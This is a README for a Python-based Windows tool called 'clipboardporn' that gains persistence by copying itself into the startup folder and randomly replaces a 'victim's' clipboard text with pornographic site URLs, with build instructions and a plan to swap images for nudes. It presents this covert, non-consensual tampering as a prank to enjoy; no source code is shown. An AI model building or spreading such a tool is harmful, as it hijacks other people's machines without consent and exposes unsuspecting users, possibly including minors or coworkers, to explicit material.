# clipboardporn
Swaps text from the Windows clipboard for random porn site urls.

This repo includes scripts for compilation into a single ".exe".

The script gets persistance, by copying itself into shell:startup.

Everytime the victim copies text into the clipboard, there's one in three chances that it will be replaced for a random porn site url.

There's about sixteen thousand porn sites url which may be picked.

Enjoy!


## Requirements
* Python3.7
* pipenv
    - `pip install pipenv`
* Module dependencies (pyperclip, winshell), installed via ´pipenv´


## Note
This should be built on Windows, as `pyinstaller` doesn't support cross-compilation. You may adapt the process to be run under `wine`, though.


## Quickstart

1. `git clone https://github.com/BrunoFauth/clipboardporn`
1. `cd clipboardporn`
1. `pipenv install`
1. `cd clipboardporn`
1. `pipenv run build.bat`


#TODO
* Swap bitmaps for nudes
